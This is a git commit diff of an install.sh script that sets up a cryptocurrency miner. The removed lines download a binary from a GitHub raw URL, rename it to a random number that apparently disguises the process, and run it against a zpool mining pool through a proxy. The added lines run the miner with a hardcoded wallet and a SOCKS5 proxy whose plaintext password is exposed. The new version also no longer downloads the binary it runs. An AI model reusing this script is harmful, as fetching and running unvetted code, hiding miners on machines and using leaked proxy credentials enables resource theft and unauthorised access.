3137a6b39bdf1965f4fc2a6ca2b522eccabe3c2f
Inabirtia <90377814+Inabirtia@users.noreply.github.com>
2022-03-21 01:02:30 +0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,9 +1,3 @@
-user=$1 
-proxy=$2 
-worker=$(shuf -n 1 -i 1-9999999) 
-apt update -y 
-wget -q https://raw.githubusercontent.com/ahmadghozaliurhniyu/scmin/main/pointd 
+apt update -y
 chmod +x pointd 
-mv pointd $worker 
-chmod +x $worker 
-./$worker -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u $user.$worker -p c=DGB,zap=BUT-lyra2z330 -x $proxy
+./pointd -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u RWtWXvk8snoEYqur7DavqDYEPmymwceBFd.$(shuf -n 1 -i 1-9999999)  -p c=RVN,zap=BUT-lyra2z330 -x socks5://berkahkita:kitabersama123@185.9.52.177:5185
